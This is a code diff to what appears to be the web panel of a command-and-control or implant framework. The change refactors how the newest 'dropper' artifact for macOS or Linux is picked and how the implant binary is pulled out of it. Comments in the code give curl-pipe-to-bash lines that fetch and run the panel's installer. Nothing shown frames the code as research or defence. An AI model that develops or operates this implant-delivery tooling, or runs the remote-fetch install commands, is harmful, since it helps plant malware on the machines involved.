@@ -29,7 +29,12 @@ from starlette.concurrency import run_in_threadpool
 from . import health, landing
 from .alerts import Alerts
 from .auth import Auth
-from .build import BuildPipeline, extract_implant_from_artifact, load_build_request
+from .build import (
+    BuildPipeline,
+    extract_implant_from_artifact,
+    load_build_request,
+    pick_latest,
+)
 from .config import Settings
 from .db import Database
 from .rd import RDBroker
@@ -325,27 +330,15 @@ def create_app(settings: Settings | None = None) -> FastAPI:
     #   curl -sSL https://<panel>/install/mac  | bash   (macOS)
     #   curl -sSL https://<panel>/install/linux | bash  (Linux)
 
-    def _latest_artifact(os_name: str) -> dict | None:
-        recent = run_in_threadpool(app.state.pipeline.recent, 300)
-        matches = [a for a in recent if str(a.get("os", "")) == os_name]
-        if not matches:
-            return None
-        return max(matches, key=lambda a: float(a.get("ts", 0)))
-
-    async def _latest_artifact(os_name: str) -> dict | None:
-        recent = await run_in_threadpool(app.state.pipeline.recent, 300)
-        matches = [a for a in recent if str(a.get("os", "")) == os_name]
-        if not matches:
-            return None
-        return max(matches, key=lambda a: float(a.get("ts", 0)))
-
     async def _extract_binary_from_archive(os_name: str) -> tuple[bytes, str] | None:
         """Return the raw executable inside the newest packaged dropper artifact.
 
         The extraction itself lives in :func:`panel.build.extract_implant_from_artifact`
         so it is unit-testable without a running app/teamserver.
         """
-        art = await _latest_artifact(os_name)
+        suffix = ".command.zip" if os_name == "darwin" else ".tar.gz"
+        recent = await run_in_threadpool(app.state.pipeline.recent, 300)
+        art = await run_in_threadpool(pick_latest, recent, os_name, suffix)
         if art is None:
             return None
         return await run_in_threadpool(
